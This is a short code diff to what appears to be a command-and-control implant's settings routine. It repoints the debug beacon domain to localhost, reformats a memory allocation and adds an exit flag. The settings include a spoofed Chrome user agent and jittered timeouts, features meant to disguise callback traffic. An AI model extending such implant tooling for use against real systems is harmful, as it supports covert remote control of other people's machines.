@@ -5,7 +5,7 @@
 #ifdef DEBUG
 #define IP "127.0.0.1"
 #define ENDPOINT "/"
-#define DOMAIN "google.com"
+#define DOMAIN "127.0.0.1"
 #define USERAGENT "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 #define TIMEOUT 5
 #define PORT 8080
@@ -34,8 +34,7 @@ PSETTINGS get_settings(){
     uint8_t useragent[] = USERAGENT;
 //    uint8_t version[] = VERSION;
 
-
-    PSETTINGS set = (PSETTINGS)shaco_calloc(sizeof(SETTINGS),1);
+    PSETTINGS set = (PSETTINGS)shaco_calloc(sizeof(SETTINGS), 1);
     if(!set) return NULL;
 
     StringCopy(set->domain, (char *)domain);
@@ -45,6 +44,7 @@ PSETTINGS get_settings(){
     
     set->port = port;
     set->ssl = false;
+    set->exit = false;
     set->timeout = timeout;
     set->max_timeout = jitter;
     sett = set;
